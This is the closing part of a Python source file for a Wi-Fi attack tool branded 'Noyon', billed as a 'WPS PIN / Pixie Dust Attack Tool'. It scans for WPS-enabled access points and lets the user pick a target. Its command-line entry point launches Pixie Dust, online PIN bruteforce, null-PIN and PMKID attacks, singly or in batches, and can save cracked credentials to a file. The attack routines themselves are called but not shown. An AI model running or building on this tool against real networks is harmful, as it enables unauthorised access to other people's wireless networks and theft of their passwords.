        wps_on_count = len(networks)

        W = self.LINE_WIDTH
        print()
        print(f'{C.B_CYAN}╔{"═" * W}╗{C.RESET}')
        title = '  WIFI NETWORKS — WPS ON ONLY'
        pad = (W - _str_width(title)) // 2
        print(f'{C.B_CYAN}║{C.RESET}{" " * pad}{C.B_WHITE}{C.BOLD}{title}{C.RESET}'
              f'{" " * (W - pad - _str_width(title))}{C.B_CYAN}║{C.RESET}')
        print(f'{C.B_CYAN}╠{"═" * W}╣{C.RESET}')
        summary = (f'  WPS ON: {wps_on_count}  |  '
                   f'Scanned: {total_scanned}  |  '
                   f'Filtered out: {total_scanned - wps_on_count}')
        print(f'{C.B_CYAN}║{C.RESET}{C.GRAY}{summary}{C.RESET}'
              f'{" " * (W - _str_width(summary))}{C.B_CYAN}║{C.RESET}')
        print(f'{C.B_CYAN}╚{"═" * W}╝{C.RESET}')

        items = list(network_list.items())
        if self.reverse_scan:
            items = items[::-1]

        for n, network in items:
            model = '{} {}'.format(network['Model'],
                                   network['Model number']).strip()
            essid = network.get('ESSID', 'HIDDEN')

            wps_state = network.get('WPS state', 0)
            wps_locked = network['WPS locked']

            if wps_locked:
                accent = C.B_RED
                tag = f'{C.B_RED}◉ WPS ON  🔒 LOCKED{C.RESET}'
            elif wps_state == 2:
                accent = C.B_GREEN
                tag = f'{C.B_GREEN}◉ WPS ON{C.RESET}'
            elif wps_state == 1:
                accent = C.B_YELLOW
                tag = f'{C.B_YELLOW}◉ WPS ON (unconfigured){C.RESET}'
            else:
                accent = C.B_GREEN
                tag = f'{C.B_GREEN}◉ WPS ON{C.RESET}'

            print()
            print()
            print(f'  {C.B_RED}▌{C.RESET} {C.B_RED}{C.BOLD}{n}{C.RESET}'
                  + (f'   {tag}' if tag else ''))
            print(f'  {accent}{"━" * W}{C.RESET}')

            label_w = 10
            def row(label, value, color=C.WHITE):
                label_str = f'{label:<{label_w}}'
                print(f'  {C.DARKGRAY}│{C.RESET}  '
                      f'{C.BOLD}{label_str}{C.RESET}: {color}{value}{C.RESET}')

            row('BSSID', network['BSSID'], C.B_CYAN)
            row('ESSID', essid, C.B_WHITE)
            row('Security', network['Security type'], C.GOLD)

            wps_label = f'{"WPS":<{label_w}}'
            if wps_locked:
                wps_display = f'{C.B_RED}ON  🔒 LOCKED{C.RESET}'
            elif wps_state == 2:
                wps_display = f'{C.B_GREEN}ON  (Configured){C.RESET}'
            elif wps_state == 1:
                wps_display = f'{C.B_YELLOW}ON  (Unconfigured){C.RESET}'
            else:
                wps_display = f'{C.B_GREEN}ON{C.RESET}'
            print(f'  {C.DARKGRAY}│{C.RESET}  '
                  f'{C.BOLD}{wps_label}{C.RESET}: {wps_display}')

            row('Signal', f'{network["Level"]} dBm', C.B_GREEN
                if network['Level'] > -60 else C.B_YELLOW)
            if network['Device name'] or model:
                dev = f'{network["Device name"]} {model}'.strip()
                row('Device', dev, C.GRAY)

            print(f'  {accent}{"━" * W}{C.RESET}')

        print()
        return network_list

    @staticmethod
    def _decode(d):
        return (codecs.decode(d, 'unicode-escape')
                .encode('latin1').decode('utf-8', errors='replace'))

    # ── Fix #1: recursion removed, loop-based prompt ──
    def prompt_network(self) -> str:
        while True:
            networks = self.iw_scanner()
            if not networks:
                print(f'{C.B_RED}[-]{C.RESET} No networks found.')
                return ''
            rescan = False
            while True:
                try:
                    networkNo = input(
                        f'\n{C.GOLD}┌─[{C.RESET}{C.GOLD}{C.BOLD}Select Target{C.RESET}'
                        f'{C.GOLD}]{C.RESET}\n'
                        f'{C.GOLD}└─▶{C.RESET} '
                        f'{C.DARKGRAY}(Enter to refresh){C.RESET}: '
                    )
                    if networkNo.lower() in ('r', '0', ''):
                        rescan = True
                        break
                    if int(networkNo) in networks.keys():
                        return networks[int(networkNo)]['BSSID']
                    raise IndexError
                except Exception:
                    print(f'{C.B_RED}[!]{C.RESET} Invalid number')
            if rescan:
                continue
            return ''


# ═══════════════════════════════════════════════════════════════════
#  UTILITIES
# ═══════════════════════════════════════════════════════════════════
def ifaceUp(iface, down=False):
    action = 'down' if down else 'up'
    res = subprocess.run(f'ip link set {iface} {action}', shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return res.returncode == 0


def die(msg):
    sys.stderr.write(f'{C.B_RED}[✘]{C.RESET} {msg}\n')
    sys.exit(1)


def show_banner():
    print()
    W = 44
    print(f'{C.GOLD}╔{"═" * W}╗{C.RESET}')
    print(f'{C.GOLD}║{C.RESET}{" " * W}{C.GOLD}║{C.RESET}')
    title = '◆  N O Y O N  ◆'
    tw = _str_width(title)
    pad = (W - tw) // 2
    print(f'{C.GOLD}║{C.RESET}{" " * pad}'
          f'{C.B_RED}{C.BOLD}{title}{C.RESET}'
          f'{" " * (W - pad - tw)}{C.GOLD}║{C.RESET}')
    subtitle = 'WPS PIN / Pixie Dust Attack Tool'
    sw = _str_width(subtitle)
    pad2 = (W - sw) // 2
    print(f'{C.GOLD}║{C.RESET}{" " * pad2}'
          f'{C.B_CYAN}{subtitle}{C.RESET}'
          f'{" " * (W - pad2 - sw)}{C.GOLD}║{C.RESET}')
    print(f'{C.GOLD}║{C.RESET}{" " * W}{C.GOLD}║{C.RESET}')
    print(f'{C.GOLD}╟{"─" * W}╢{C.RESET}')
    info_rows = [
        ('Author     ', 'NOYON BHAI',                C.B_GREEN),
        ('Based on   ', 'NOYON BHAI (OneShotPin)',   C.WHITE),
        ('Version    ', 'MAX PRO ULTRA v3.1',        C.B_YELLOW),
    ]
    for label, value, valcolor in info_rows:
        visible = 2 + 11 + 2 + _str_width(value)
        pad_end = W - visible
        print(f'{C.GOLD}║{C.RESET}  {C.GRAY}{label}{C.RESET}: '
              f'{valcolor}{value}{C.RESET}'
              f'{" " * pad_end}{C.GOLD}║{C.RESET}')
    print(f'{C.GOLD}╚{"═" * W}╝{C.RESET}')
    print()


# ═══════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(
        description='Noyon.py — WPS attack tool by NOYON BHAI',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K')
    parser.add_argument('-i', '--interface', type=str, required=True,
                        help='Name of the interface to use')
    parser.add_argument('-b', '--bssid', type=str, help='BSSID of the target AP')
    parser.add_argument('-p', '--pin', type=str, help='Use the specified pin')
    parser.add_argument('-N', '--null-pin', action='store_true',
                        help='Use a null PIN (00000000)')
    parser.add_argument('-K', '--pixie-dust', action='store_true',
                        help='Run Pixie Dust attack')
    parser.add_argument('-F', '--pixie-force', action='store_true',
                        help='Run Pixiewps with --force option')
    parser.add_argument('-X', '--show-pixie-cmd', action='store_true',
                        help='Always print Pixiewps command')
    parser.add_argument('-B', '--bruteforce', action='store_true',
                        help='Run online bruteforce attack')
    parser.add_argument('--pbc', '--push-button-connect', action='store_true',
                        help='Run WPS push button connection')
    parser.add_argument('--pmkid', action='store_true',
                        help='Run PMKID attack (works without WPS)')
    parser.add_argument('-d', '--delay', type=float,
                        help='Set the delay between pin attempts')
    parser.add_argument('-w', '--write', action='store_true',
                        help='Write credentials to file on success')
    parser.add_argument('--iface-down', action='store_true',
                        help='Down network interface when finished')
    parser.add_argument('--vuln-list', type=str,
                        default=os.path.dirname(os.path.realpath(__file__))
                                + '/vulnwsc.txt',
                        help='Use custom file with vulnerable devices list')
    parser.add_argument('-l', '--loop', action='store_true',
                        help='Run in a loop')
    parser.add_argument('-r', '--reverse-scan', action='store_true',
                        help='Reverse order of networks in the list')
    parser.add_argument('--mtk-wifi', action='store_true',
                        help='Activate MediaTek Wi-Fi interface driver')
    parser.add_argument('--no-dep-check', action='store_true',
                        help='Skip dependency check')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')
    parser.add_argument('--kill', action='store_true',
                        help='Kill interfering processes (NetworkManager, etc.)')
    parser.add_argument('--restore', action='store_true',
                        help='Restore killed processes on exit')
    parser.add_argument('--bssid-list', type=str,
                        help='File containing list of BSSIDs for batch mode')
    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die('The program requires Python 3.6 and above')
    if os.getuid() != 0:
        die('Run it as root')

    # ── Fix #4: MAC validation on CLI input ──
    if args.bssid and not MAC_RE.match(args.bssid):
        die(f'Invalid BSSID format: "{args.bssid}" '
            f'(expected AA:BB:CC:DD:EE:FF)')

    if not args.no_dep_check:
        check_dependencies()

    if args.mtk_wifi:
        wmtWifi_device = Path('/dev/wmtWifi')
        if not wmtWifi_device.is_char_device():
            die('Unable to activate MediaTek Wi-Fi device (--mtk-wifi): '
                '/dev/wmtWifi does not exist')
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text('1')

    if not ifaceUp(args.interface):
        die(f'Unable to up interface "{args.interface}"')

    show_banner()
    companion = None
    while True:
        try:
            companion = Companion(args.interface, args.write,
                                  print_debug=args.verbose,
                                  bssid=args.bssid or '')
            companion.loop_mode = args.loop

            if args.kill:
                companion.kill_interfering_processes()

            if args.pbc:
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid and not args.bssid_list:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as f:
                            vuln_list = f.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    scanner = WiFiScanner(args.interface, vuln_list,
                                          reverse_scan=args.reverse_scan)
                    if not args.loop:
                        print(f'{C.B_CYAN}[*]{C.RESET} BSSID not specified '
                              f'({C.GOLD}--bssid{C.RESET}) — '
                              f'scanning for available networks')
                    args.bssid = scanner.prompt_network()
                    # Validate scanner-returned BSSID
                    if args.bssid and not MAC_RE.match(args.bssid):
                        die(f'Invalid BSSID from scanner: {args.bssid}')

                if args.bssid_list:
                    try:
                        with open(args.bssid_list, 'r') as f:
                            bssids = [line.strip() for line in f
                                      if line.strip()]
                    except FileNotFoundError:
                        die(f'BSSID list file not found: {args.bssid_list}')
                    # Validate all BSSIDs first
                    invalid = [b for b in bssids if not MAC_RE.match(b)]
                    if invalid:
                        die(f'Invalid BSSIDs in list file: '
                            f'{", ".join(invalid[:5])}'
                            + (' …' if len(invalid) > 5 else ''))
                    for b in bssids:
                        companion.bssid = b
                        if args.pmkid:
                            companion.pmkid_attack(b)
                        elif args.bruteforce:
                            companion.smart_bruteforce(b, args.pin, args.delay)
                        else:
                            companion.single_connection(
                                b, args.pin, args.pixie_dust, args.pbc,
                                args.show_pixie_cmd, args.pixie_force,
                                null_pin=args.null_pin)
                elif args.bssid:
                    companion.bssid = args.bssid
                    if args.pmkid:
                        companion.pmkid_attack(args.bssid)
                    elif args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(
                            args.bssid, args.pin,
                            args.pixie_dust, args.pbc,
                            args.show_pixie_cmd, args.pixie_force,
                            null_pin=args.null_pin)
            if not args.loop:
                break
            try:
                companion.cleanup()
            except Exception:
                pass
            args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input(f'\n{C.B_YELLOW}[?]{C.RESET} Exit the script? [N/y] '
                         ).lower() == 'y':
                    print(f'{C.B_YELLOW}Aborting…{C.RESET}')
                    break
                args.bssid = None
            else:
                print(f'\n{C.B_YELLOW}Aborting…{C.RESET}')
                break

    if companion is not None:
        if args.restore:
            companion.restore_processes()
        try:
            companion.cleanup()
        except Exception:
            pass

    if args.iface_down:
        ifaceUp(args.interface, down=True)
    if args.mtk_wifi:
        wmtWifi_device.write_text('0')
